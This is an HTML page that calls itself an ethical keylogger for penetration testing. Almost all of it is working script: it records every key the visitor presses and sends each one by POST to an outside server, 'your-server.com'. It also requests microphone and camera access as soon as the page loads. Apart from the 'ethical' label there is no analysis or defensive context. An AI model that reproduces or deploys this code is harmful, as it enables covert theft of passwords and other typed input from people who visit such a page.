<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Keylogger for Penetration Testing</title>
</head>
<body>
    <h2>Ethical Keylogger Test</h2>
    <p>This tool is for ethical hacking purposes, testing, and vulnerability assessments.</p>

    <script>
        // Keystroke logger
        document.addEventListener('keydown', function(event) {
            const keystroke = event.key;
            console.log('Key pressed: ' + keystroke);

            // Send keystrokes to the server or log them locally
            fetch('http://your-server.com/log-keystrokes', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ keystroke: keystroke })
            });
        });

        // Accessing the microphone with user's permission
        async function accessMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                console.log('Microphone access granted');
                // Handle microphone stream, e.g., recording audio
            } catch (err) {
                console.error('Microphone access denied', err);
            }
        }

        // Accessing the camera with user's permission
        async function accessCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                console.log('Camera access granted');
                // Handle video stream, e.g., recording video
            } catch (err) {
                console.error('Camera access denied', err);
            }
        }

        // Call functions to request access
        accessMicrophone();
        accessCamera();
    </script>
</body>
</html>
